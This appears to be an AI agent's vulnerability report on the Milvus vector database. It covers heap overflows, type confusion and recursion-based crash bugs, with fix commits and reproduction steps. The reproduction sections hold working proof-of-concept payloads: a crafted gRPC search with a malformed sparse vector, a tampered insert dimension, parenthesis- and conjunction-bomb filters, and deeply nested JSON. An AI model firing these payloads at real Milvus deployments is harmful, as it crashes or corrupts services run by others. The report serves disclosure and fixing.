# Milvus Security Variant Hunt — Findings

**Repo:** milvus-io/milvus (fork: matiasinsaurralde/milvus)
**HEAD:** `b7cbb91a161c1830bd0a54e024c48cb8dc8f468d`
**Branch:** `claude/milvus-security-variants-hgddyk`
**Focus:** RCE and DoS paths (memory-corruption prioritized), with reachability gated on attacker → input → sink and adversarial falsification of each candidate.

> **Verification caveat.** The C++ segcore could **not** be compiled or run in the analysis
> environment. Every finding below is verified by direct source inspection and control-/data-flow
> reasoning, and each fix mirrors an existing in-tree pattern. **None of the fixes have been
> compiled or unit-tested.** The [How to test](#how-to-test-in-your-environment) section gives
> concrete, per-finding build + repro steps (AddressSanitizer + unit tests + end-to-end).

---

## Summary

| # | Finding | Class | Reachability | Status |
|---|---------|-------|--------------|--------|
| F1 | Sparse-vector search placeholder heap overflow | OOB heap **write** | **External** — any user who can `Search` a sparse field | ✅ Fixed `13de8c7` |
| F2 | Array-of-float-vector insert heap overflow | OOB heap **write** (attacker len+content) + div-by-zero | **External** — any user who can `Insert` an array-of-vector field | ✅ Fixed `c6cd4b7` |
| F3 | `ParseColumnExprs` type confusion → wild deref | Type confusion (arbitrary read) | **Internal only** (crafted plan proto direct to querynode) | ✅ Fixed `4779fa1` (defense-in-depth) |
| D1 | Unbounded expr/plan recursion → uncatchable crash | DoS (proxy + querynode process kill) | **External** — single Search/Query/Delete | ⚠️ Documented, not fixed |
| D2 | `TraverseJsonForStats` unbounded recursion | DoS (persistent, data-triggered node crash) | **External** — single Insert (≤64 KB) | ⚠️ Documented, not fixed |
| D3 | All-NULL / empty-array batch assertion | DoS (query failure + segment poisoning) | **External** — Insert + Search | ⚠️ Documented, not fixed |
| N1 | `FieldData.cpp` metadata-`dim` vs arrow-width over-read | OOB heap **read** | Internal only (object-store write access) | ⚠️ Documented (defense-in-depth) |
| N2 | `Span<T>` reinterpret guard is a stripped `assert` | Hardening chokepoint | Internal only | ⚠️ Documented (follow-up hardening) |
| D4 | `large_topk` removes the nq×topK implicit bound | DoS (resource) | Config + collection-ownership gated | ⚠️ Documented (low) |

Killed / cleared candidates are listed at the [end](#killed--cleared).

---

## Fixed findings

### F1 — Sparse-vector search placeholder heap overflow (EXTERNAL, memory-corruption write)

**Sink:** `internal/core/src/common/Utils.h`, `CopyAndWrapSparseRow` (pre-fix lines 272–300).

```cpp
size_t num_elements = size / SparseRow<>::element_size();   // element_size() == 8 (u32 id + f32 val)
SparseRow<> row(num_elements);                              // allocates floor(size/8)*8 bytes
FastMemcpy(row.data(), data, size);                         // copies `size` bytes  <-- OVERFLOW
if (validate) {
    AssertInfo(size % element_size() == 0, ...);            // the length check runs AFTER the copy
    ...
}
```

- If `size % 8 != 0`, the destination holds `floor(size/8)*8 < size` bytes but `size` bytes are
  copied — a heap write of `size % 8` (1–7) attacker-controlled bytes past the allocation.
- If `1 <= size <= 7`, `num_elements == 0` → `SparseRow(0)` yields a null/zero-size buffer →
  `memcpy(nullptr, …)` → crash.
- The `size % 8 == 0` assertion is at line 281, **after** the memcpy, so it cannot prevent the
  corruption even on the validated path.

**Reachability (external):**
- Search calls it with attacker bytes: `internal/core/src/query/Plan.cpp:173-174`
  `SparseBytesToRows(ph.values(), /*validate=*/true)` — `ph.values()` are the raw client-supplied
  placeholder-group bytes. The only earlier check (`Plan.cpp:163`) validates vector *type*, not length.
- The proxy does **not** validate sparse placeholder bytes:
  `internal/proxy/vector_type_convert.go:95-99` explicitly passes `SparseFloatVector` placeholders
  through unchanged (only fp32→fp16/bf16 is converted).
- All insert paths *are* validated (`typeutil.ValidateSparseFloatRows`, `pkg/util/typeutil/schema.go`),
  so the gap is search-vs-insert: the search placeholder is the one attacker-controlled sparse path
  with no Go-side length check, landing on the one C++ path whose length check is mis-ordered.

**Impact:** remotely-triggerable OOB heap write (1–7 bytes) or null-write crash. Scoped as a
memory-corruption primitive; full RCE would depend on knowhere allocator layout (not asserted here).

**Fix (`13de8c7`):** move the `size % element_size() == 0` check **before** the allocation/copy and
make it **unconditional** — a non-multiple-of-`element_size` length is always malformed.

---

### F2 — Array-of-float-vector insert heap overflow (EXTERNAL, memory-corruption write)

**Sink:** `internal/core/src/common/VectorArray.h`, `VectorArray(const VectorFieldProto&)`, FLOAT case
(pre-fix lines 56–72).

```cpp
dim_    = vector_field.dim();                                  // untrusted per-row VectorField.Dim
length_ = vector_field.float_vector().data().size() / dim_;    // FLOOR division
auto data = new float[length_ * dim_];                         // under-allocates
size_   = vector_field.float_vector().data().size() * sizeof(float);
FastMemcpy(data, ...float_vector().data().data(),
           vector_field.float_vector().data().size()*sizeof(float));  // copies the FULL payload
```

- Buffer is `floor(N/dim_)*dim_` floats (N = float count), but the memcpy copies **N** floats.
  When `N` is not a multiple of `dim_`, this writes `N mod dim_` floats past the allocation.
- When `dim_ > N`, `length_ = 0` → `new float[0]` → the **entire** attacker payload is written past a
  zero-length allocation. Both the overflow length and content are attacker-controlled.
- `dim_ == 0` is a division-by-zero DoS (all element-type branches divide by it).

**Reachability (external):**
- Insert path constructs it from the raw per-row proto:
  `internal/core/src/segcore/ConcurrentVector.cpp:70,81,92` `VectorArray(vector_array[i])`.
- The proxy validation gap: `internal/proxy/validate_util.go:1219-1239`
  (`checkArrayOfVectorFieldData`, FLOAT) validates payload length only against the **schema** dim
  (`typeutil.GetDim`, line 1185/1226); it never reads the inner per-row `vector.GetDim()`.
  `checkAligned` (`validate_util.go:402-430`) checks only the **outer** `VectorArray.GetDim()`.
  Nothing normalizes the inner `VectorField.Dim` to the schema dim before it reaches C++.

**Attacker recipe:** schema element dim `D=128`; payload = 512 floats (`512 % 128 == 0`, passes);
inner proto `Dim = 1<<30`. In C++: `length_ = 512 / 2^30 = 0` → `new float[0]` → memcpy of 2 KB of
attacker floats past a zero buffer. Scale payload → hundreds of KB of controlled heap overflow.

**Impact:** remotely-triggerable, fully attacker-controlled heap OOB write on the growing-segment
insert path. The strongest RCE-relevant primitive found. (Binary/fp16/bf16/int8 branches allocate
`size_` = the real byte length and are **not** vulnerable; only FLOAT derived the allocation from `dim_`.)

**Fix (`c6cd4b7`):** size the float destination to the actual payload (`size_` bytes, matching the
other element types) so allocation always equals the copy; and `AssertInfo(dim_ > 0)` before any
division. Behavior is unchanged for well-formed data (payload length a whole multiple of `dim_`).

---

### F3 — `ParseColumnExprs` type confusion (INTERNAL only, defense-in-depth)

**Sink:** `internal/core/src/query/PlanProto.cpp:1276-1279` (pre-fix):

```cpp
expr::TypedExprPtr
ProtoParser::ParseColumnExprs(const proto::plan::ColumnExpr& expr_pb) {
    return std::make_shared<expr::ColumnExpr>(expr_pb.info());   // no schema type check
}
```

Every other column-bearing parser asserts `column_info.data_type()` equals the real schema field type
(`ParseUnaryRangeExprs:1013`, `ParseTermExprs:1183`, `ParseCompareExprs:1147/1161`,
`ParseGISFunctionFilterExprs:1298`, …). `ParseColumnExprs` was the single omission. A `ColumnExpr`
reaches evaluation as a **CallExpr function argument**, parsed with `TypeIsAny`
(`PlanProto.cpp:1117-1119`); the function (`empty(VARCHAR)`, `starts_with(VARCHAR,VARCHAR)`) is
resolved purely by the *declared* arg type. A ColumnExpr declaring a numeric field as `VARCHAR` would
make `PhyColumnExpr::Eval` dispatch `DoEval<std::string>`, reinterpreting the numeric buffer as
`std::string*` (`Span<std::string>` ctor at `Span.h:96-101`, whose only guard is a C `assert` stripped
under `NDEBUG` in release) → a fabricated `std::string` whose data pointer/length are attacker-inserted
bytes → arbitrary-address read.

**Why internal only:** the proxy **generates** the serialized plan proto from the validated expr
string (`internal/proxy/task_search.go:695,1043` `proto.Marshal(plan)`; `task_query.go:842`;
`task_delete.go:485`) and always sets `ColumnExpr.data_type` to the real field type
(`parser_visitor.go` `VisitCall`/`VisitIdentifier`). `empty(int64_field)` is emitted with consistent
types and simply fails C++ function lookup (`empty(INT64)` unregistered). A mismatched ColumnExpr can
only arise from a **hand-crafted plan proto sent directly to an internal querynode** — not through the
proxy. Same threat class as N1.

**Fix (`4779fa1`):** add the same schema-vs-declared-type assertion the sibling parsers use.
Proxy-generated plans already carry consistent types, so this only rejects crafted/mismatched plans.
**Recommended companion hardening (not applied — see N2):** promote the `Span.h:100` `assert` to a
throwing `AssertInfo` so the reinterpret cannot silently proceed in release for any future caller.

---

## Confirmed DoS (documented, not fixed)

### D1 — Unbounded expression / plan recursion → uncatchable process crash (EXTERNAL, HIGH)

No length/depth/complexity guard exists between the client `expr` string and either parser, and one
built-in protection is actively disabled.

- **Proxy (Go) stack overflow.** The ANTLR parser recurses once per nesting level with no depth cap
  (`internal/parser/planparserv2/generated/plan_parser.go` `expr()`; the `Parens`/`Unary`
  alternatives from `Plan.g4`). A filter of many `(` (or `!!!…x`) drives one recursive frame per
  level. A Go goroutine stack overflow is a **fatal runtime throw, not a panic** — the `recover()` in
  `plan_parser_v2.go:157-161` cannot catch it. **The whole proxy process dies.**
- **Querynode (C++) stack overflow.** `ProtoParser::ParseExprs` →
  `ParseUnaryExprs`/`ParseBinaryExprs` (`internal/core/src/query/PlanProto.cpp:1198,1205-1206`) recurse
  per node with no guard. Aggravated by `internal/core/src/query/Plan.cpp:240`
  `input_stream.SetRecursionLimit(std::numeric_limits<int32_t>::max())`, which **disables protobuf's
  default 100-depth nested-message defense**. A conjunction chain `a && a && … && a` (~10⁵ terms) — a
  depth Go's ~1 GB stack survives but C++'s 8 MB stack does not — overflows in `ParseExprs`. **SIGSEGV,
  querynode dies.**
- The proxy gRPC `serverMaxRecvSize` is 64 MB (`configs/milvus.yaml:441`) — orders of magnitude more
  than needed to overflow either stack.
- **Not** a ReDoS vector: LIKE/regex uses RE2 (`internal/core/src/common/RegexQuery.h`), which is
  linear-time. Verified safe.

**Suggested fix direction:** cap expr string length in the proxy before `CreateSearchPlan`; add an
explicit expr-tree depth check in both the Go visitor and C++ `ParseExprs`; lower `Plan.cpp:240`
`SetRecursionLimit` to a sane bound.

### D2 — `TraverseJsonForStats` unbounded recursion → persistent node crash (EXTERNAL)

`internal/core/src/index/json_stats/JsonKeyStats.cpp:288` (`TraverseJsonForStats`) and `:541`
(`TraverseJsonForBuildStats`) recurse once per nested JSON object level. The tokenizer here is
**jsmn** (`internal/core/src/common/jsmn.h`), which is iterative and has **no depth limit** (unlike
the query-time simdjson path, which is capped at 1024). Insert validation checks only byte length
(`internal/proxy/validate_util.go:987-999`, `JSONMaxLength` default 64 KB), never nesting depth. JSON
shredding is **on by default** (`common.enabledJSONShredding = "true"`) and runs as a background
sealed-segment stats task — so a single inserted value `{"a":{"a":{"a": … ~10k deep … }}}` (≤64 KB)
crashes the node when the segment seals, and re-crashes on each retry. The **dynamic field ($meta)**
uses the same path, so any collection with dynamic fields is exposed without a declared JSON column.

**Suggested fix direction:** cap object-nesting depth in the traversal, and/or add a depth check at
insert validation.

### D3 — All-NULL / empty-array batch assertion → query-failure DoS + segment poisoning (EXTERNAL)

`internal/core/src/exec/operator/ElementFilterBitsNode.cpp:266` (`AssertInfo(results[0] != nullptr)`,
full-scan element-filter path). A mid-segment 8192-row batch whose rows are all NULL / empty arrays
yields `elem_count == 0`, every evaluator returns `nullptr`, and the assert throws. Reachable with
~16 K rows shaped `[1 non-empty] [≥8192 NULL/empty] [1 non-empty]` on a struct/nullable-ARRAY field
plus a broad-predicate query (forces full mode). This is a **caught** `SegcoreError` (verified: the
folly future layer at `Future.h:355-390` captures it before any `noexcept`/thread boundary) → a failed
query, **not** a process crash. Severity is the persistence angle: the poisoning data shape makes every
full-mode element-filter query on that field fail until compaction. This is the case PR #51540
explicitly deferred ("should be handled separately").

### D4 — `large_topk` removes the implicit nq×topK bound (resource DoS, gated)

`large_topk` query mode (2.6.14) raises topK/window caps from 16384 to **1,000,000**
(`pkg/util/paramtable/quota_param.go:1458-1493`). Each segment holds `nq * topK` result arrays
(`internal/core/src/segcore/reduce/Reduce.cpp:125`) with no combined product cap, and `nq` stays
capped at 16384. So a `large_topk` collection allows a single request to request ~16384×1,000,000
result slots per segment → OOM. Gated: `largeTopKEnabled` comes from the collection property
`query_mode` (`internal/proxy/meta_cache.go:592`), requiring collection-alter privilege — a
multi-tenant amplifier, not an unauth finding.

---

## Documented — not remotely reachable (defense-in-depth)

### N1 — `FieldData.cpp` metadata-`dim` vs arrow-element-width over-read (INTERNAL only)

`internal/core/src/common/FieldData.cpp:445-468` (VECTOR_ARRAY) and `:363-373,740-751`
(nullable fixed-size vectors) size a `memcpy` from the parquet-metadata `DIM_KEY`
(`storage/PayloadReader.cpp:138-152`) while the arrow buffer's real element width is a separate value —
a heap over-read if they disagree. **Not remotely reachable:** every data-plane path that ingests
attacker-influenced files re-derives dim from the collection schema and re-serializes into
Milvus-written binlogs (import: `importutilv2/parquet/field_reader.go:64,1311-1335` +
`datanode/importv2/task_import.go:176,260-312`; binlog-import: `importutilv2/binlog/reader.go:116-155`),
or copies only Milvus-generated segments (snapshot restore:
`datacoord/copy_segment_task.go:585,621-625`, `snapshot_manager.go:1128-1138`). Triggering it requires
pre-existing object-store (S3/MinIO) write access. **Hardening (not applied):** assert
`bytes_per_vec == binary_array->byte_width()` (VECTOR_ARRAY) and `dim_*sizeof(Type) == per-row width`
(nullable) before copying — mirror the safe V2 `ChunkWriter.cpp` pattern.

### N2 — `Span<T>` reinterpret guard is a stripped `assert` (chokepoint hardening)

`internal/core/src/common/Span.h:100` `assert(base.element_sizeof() == sizeof(T))` — the shared guard
for every `SpanBase → Span<T>` reinterpret — is a C `assert`, compiled out under `NDEBUG` (release
builds, `BUILD_TYPE=Release`). Promoting it to a throwing `AssertInfo`/`ThrowInfo` is safe by
construction (a size mismatch is always memory-unsafe) and would be a release-time backstop for F3-class
type confusions. **Not applied** because F3's parser-level assert already closes the reachable vector,
and adding an include to this heavily-included core header could not be compile-verified here.

---

## Killed / cleared

- **Growing-segment `InsertRecord` UAF × schema evolution** — schema-evolution `Reopen` is
  append-only (`emplace`, never `erase`), now guarded by `field_map_mutex_` (fix for #50377/#50484);
  the freeing ops (`drop_field_data`/`clear` on the growing record) still have **zero callers**.
  Residual latent-pointer risk unchanged (raw `VectorBase*` escapes the shared lock — only safe while
  no destructive op runs concurrently with reads).
- **Lifecycle UAF / double-free** (segment release, mmap/chunk eviction, index reopen/drop, string/JSON
  views, cgo boundary) — all protected: Go `LoadStateLock` Pin/Unpin refcount, cachinglayer
  `PinWrapper` pins, copy-on-write atomic published state, and the `SegmentReadGate` drain. No live bug.
  One fragile watch-point: the direct `DropFieldData`/`DropIndex` C-APIs (`segment_c.cpp:833-886`) don't
  drain readers and rely purely on the pin/COW contract.
- **LIKE / regex ReDoS** — RE2, linear-time. Safe.
- Prior-record leads re-confirmed complete: `heapMergeReduce` mixed-PK (unreachable), conjunct-filter
  OOB (guarded), thread-pool future draining (by-value/guarded), REST v2 early-return sweep.

---

## How to test in your environment

### 0. Build the core with AddressSanitizer + unit tests

```bash
# From repo root. -a = AddressSanitizer, -u = build (and enable) unit tests.
# (3rdparty deps are fetched/built on first run; this is a long build.)
scripts/core_build.sh -a -u
# Unit-test binaries are emitted to:
ls internal/core/output/unittest/
```

For a running instance under ASan, build the whole thing with ASan and start standalone
(`scripts/standalone_embed.sh` for a no-external-deps run, or a normal `make` + `scripts/start_standalone.sh`).
ASan turns each OOB write below into a hard, symbolized `heap-buffer-overflow` abort instead of silent
corruption. Note `scripts/run_cpp_codecov.sh` sets `ASAN_OPTIONS=detect_container_overflow=0` to avoid a
protobuf-5.x false positive — reuse that when running the test binaries.

### F1 — Sparse-vector search placeholder overflow

**Fastest (C++ unit test under ASan).** Add a test next to the existing sparse tests
(e.g. `internal/core/src/segcore/SegmentGrowingTest.cpp`, which already calls
`CopyAndWrapSparseRow`) and build with `scripts/core_build.sh -a -u`:

```cpp
TEST(SparseRow, MalformedLengthRejectedBeforeCopy) {
    // 9 bytes: not a multiple of element_size() (==8).
    std::vector<uint8_t> buf(9, 0xAB);
    // Pre-fix: FastMemcpy copies 9 bytes into an 8-byte allocation -> ASan heap-buffer-overflow.
    // Post-fix: throws SegcoreError before allocating.
    EXPECT_ANY_THROW(
        milvus::CopyAndWrapSparseRow(buf.data(), buf.size(), /*validate=*/true));
    // size in [1,7] pre-fix: memcpy into a null/zero-size buffer.
    std::vector<uint8_t> tiny(4, 0xAB);
    EXPECT_ANY_THROW(
        milvus::CopyAndWrapSparseRow(tiny.data(), tiny.size(), /*validate=*/true));
}
```

Run: `internal/core/output/unittest/<the_test_binary> --gtest_filter=SparseRow.*`. On a pre-fix
ASan build the first `CopyAndWrapSparseRow` aborts with `heap-buffer-overflow ... WRITE of size 1`
inside `FastMemcpy`; post-fix it throws and the test passes.

**End-to-end (crafted placeholder against a running ASan standalone).** pymilvus builds only
well-formed placeholders, so craft the raw `PlaceholderGroup` proto (the malformed row is a value whose
byte length ≢ 0 mod 8):

```python
# Requires: pip install pymilvus; a Milvus standalone built with ASan running on :19530.
from pymilvus import MilvusClient, DataType
from pymilvus.grpc_gen import common_pb2, milvus_pb2
from pymilvus.grpc_gen import milvus_pb2_grpc
import grpc

c = MilvusClient("http://localhost:19530")
schema = c.create_schema(auto_id=True)
schema.add_field("id", DataType.INT64, is_primary=True)
schema.add_field("sv", DataType.SPARSE_FLOAT_VECTOR)
c.create_collection("sparse_poc", schema=schema)
c.create_index("sparse_poc", index_params=c.prepare_index_params(
    field_name="sv", index_type="SPARSE_INVERTED_INDEX", metric_type="IP"))
c.load_collection("sparse_poc")

# One malformed sparse "vector": 9 bytes (not a multiple of 8).
ph = common_pb2.PlaceholderValue(
    tag="$0", type=common_pb2.PlaceholderType.SparseFloatVector,
    values=[b"\xAB" * 9])          # <-- the bug trigger
phg = common_pb2.PlaceholderGroup(placeholders=[ph]).SerializeToString()

ch = grpc.insecure_channel("localhost:19530")
stub = milvus_pb2_grpc.MilvusServiceStub(ch)
req = milvus_pb2.SearchRequest(
    collection_name="sparse_poc",
    placeholder_group=phg,
    dsl_type=common_pb2.DslType.BoolExprV1,
    search_params=[common_pb2.KeyValuePair(key="anns_field", value="sv"),
                   common_pb2.KeyValuePair(key="topk", value="10"),
                   common_pb2.KeyValuePair(key="metric_type", value="IP"),
                   common_pb2.KeyValuePair(key="params", value="{}"),
                   common_pb2.KeyValuePair(key="round_decimal", value="-1")],
    nq=1)
print(stub.Search(req))    # pre-fix ASan build: querynode aborts with heap-buffer-overflow
                           # post-fix: returns a clean "Invalid size for sparse row data" error
```

Watch the querynode log / coredump. Pre-fix ASan build → `heap-buffer-overflow` in
`CopyAndWrapSparseRow`. Post-fix → clean error, node stays up. (Field/param names track the proto at
`internal/core/src/query/Plan.cpp:171-174`; adjust to your pymilvus version's proto module paths.)

### F2 — Array-of-float-vector insert overflow

**C++ unit test under ASan.** Construct the crafted per-row proto directly:

```cpp
TEST(VectorArray, InnerDimMismatchNoOverflow) {
    milvus::proto::schema::VectorField vf;
    vf.set_dim(1 << 30);                                   // untrusted inner dim >> payload
    auto* fv = vf.mutable_float_vector();
    for (int i = 0; i < 512; ++i) fv->add_data(1.0f);      // schema-legal length (multiple of 128)
    // Pre-fix: length_ = 512 / 2^30 = 0 -> new float[0] -> FastMemcpy 2KB -> ASan heap overflow.
    // Post-fix: allocates size_ (2KB) and copies size_ -> no overflow; dim_>0 guard also holds.
    EXPECT_NO_FATAL_FAILURE({ milvus::VectorArray va(vf); (void)va; });

    milvus::proto::schema::VectorField z;                  // dim_ == 0 -> div-by-zero pre-fix
    z.set_dim(0); z.mutable_float_vector()->add_data(1.0f);
    EXPECT_ANY_THROW({ milvus::VectorArray va(z); (void)va; });
}
```

Add it to a unittest that includes `common/VectorArray.h` (list it in
`internal/core/unittest/CMakeLists.txt` `MILVUS_TEST_FILES`), build `scripts/core_build.sh -a -u`,
run under ASan. Pre-fix → `heap-buffer-overflow WRITE` in `FastMemcpy`; post-fix → passes.

**End-to-end (crafted insert against a running ASan standalone).** The SDK sets the inner `Dim` from
the schema, so tamper the raw `InsertRequest`. Create a collection with an array-of-float-vector
("embedding list") field, then build the `FieldData` for it with `VectorField.dim` set to `1<<30`
while the `FloatArray.data` length stays a multiple of the schema dim (e.g. 512 for dim 128). Send via
the low-level `MilvusServiceStub.Insert`. Pre-fix ASan build: the datanode/querynode growing-insert
(`ConcurrentVector.cpp:70`) aborts with a heap overflow; post-fix: clean rejection / correct insert.
(If array-of-vector isn't enabled in your build, this path is unreachable — confirm the field type is
accepted by `create_collection` first.)

### F3 — `ParseColumnExprs` type confusion (crafted plan proto)

Not reachable through pymilvus (the proxy regenerates the plan). To exercise it, target the querynode
directly or unit-test `ProtoParser`: build a `proto::plan::PlanNode` whose predicate is a `CallExpr`
`{ function_name:"empty", function_parameters:[ ColumnExpr{ info:{ field_id:<INT64 field>,
data_type:VARCHAR(21) } } ] }`, then call `CreateRetrievePlanByExpr`/`CreateSearchPlanByExpr` with the
real schema. Pre-fix (release/`NDEBUG` build, so the `Span.h` assert is stripped): the evaluator
reinterprets the INT64 column as `std::string` → ASan reports a wild/oob read when `DoEval<std::string>`
copies `std::string_view{attacker_ptr,len}`. Post-fix: `CreatePlan` throws at parse time
(`data_type == column_info.data_type()` assertion). A gtest in `test_query.cpp` / `test_string_expr.cpp`
(both already include the plan headers) is the cleanest harness.

### D1 — Parser recursion (no ASan needed; it's a crash)

```python
from pymilvus import MilvusClient
c = MilvusClient("http://localhost:19530")
# ... create+load any collection "c1" with an int64 field "a" ...
c.query("c1", filter="(" * 2_000_000 + "a > 0" + ")" * 2_000_000)   # proxy Go stack overflow
# Querynode variant: a flat conjunction deep enough to overflow the 8MB C++ stack but not Go's:
c.query("c1", filter=" and ".join(["a >= 0"] * 200_000))
```

Pre-fix: the first crashes the **proxy** (`fatal error: goroutine stack exceeds`), the second crashes a
**querynode** (SIGSEGV in `ParseExprs`). Both are process kills; watch the component logs.

### D2 — JSON-stats recursion (persistent crash)

```python
depth = 12000
val = "{" * depth + '"x":1' + "}" * depth        # nested objects, ~ (depth*? ) bytes; keep <= JSONMaxLength (64KB)
# insert one row with a JSON (or dynamic) field = val, then flush so the segment seals.
```

After the sealed-segment JSON-shredding task runs (`common.enabledJSONShredding` default on), the node
executing `TraverseJsonForStats` overflows its stack. Because the stats build retries, the crash
recurs. Use nested **objects** (arrays don't recurse). Tune `depth` upward if your worker stack is
large; the point is there is no cap.

### D3 — All-NULL ARRAY batch (query failure, not crash)

Create a collection with a struct field containing a nullable ARRAY subfield. Insert, in one growing
segment: 1 row with a non-empty array, then ≥ 8192 rows with NULL/empty array, then 1 more non-empty
row. Issue a `Search`/`Query` with an element filter on that field and no restrictive doc predicate
(forces full mode). Observe the `AssertInfo` at `ElementFilterBitsNode.cpp:266` returned as an error;
the querynode stays up (no `std::terminate`).

---

## Open RCE research threads (in progress / to continue)

These were being actively investigated when this document was written; fold results in here as they land.

1. **StorageV3 / milvus-storage packed reader** (`internal/core/src/storage/loon_ffi/`,
   external-collection refresh). The decisive question is whether a tenant with
   `RefreshExternalCollection`/external-table privilege can point a collection at packed/manifest files
   whose **contents** they control (vs. Milvus-generated), and whether the C++ packed reader trusts a
   size/offset/dim from those files. If yes, this would be the **externally-reachable** analogue of N1.
2. **Scalar ARRAY element access** (`arr[i]`, `array_length`, `array_contains`) — whether an
   attacker-controlled array index (from the expr `nested_path`, parsed via `std::stoi`) or a per-row
   element offset reaches an unchecked memory access at query time (sibling of the #51540 class).
3. **Delete/PK path and search-result reduce** — whether a count/offset mismatch (num_pks vs
   num_timestamps vs num_rows; `slice_nqs`/`slice_topKs`/prefix-sums from the request) drives an
   unvalidated allocation/index in segcore.

### Residual follow-ups from the prior hunt (not re-verified here)
- **F2/F3 (prior):** local index-cache TOCTOU (`5eb509aa`/#50608) and segcore reopen publication
  staging (`e6d549ef`/#50580) were not exhaustively variant-modeled.
- **RBAC:** request types lacking a `DBNameGetter` — confirm authz-db and execution-db can't diverge.
- **Assertion-as-DoS sweep:** `exec/expression` + `exec/operator` asserts that depend on attacker batch
  *shape* rather than internal invariants (D3 is one instance).
</content>
</invoke>
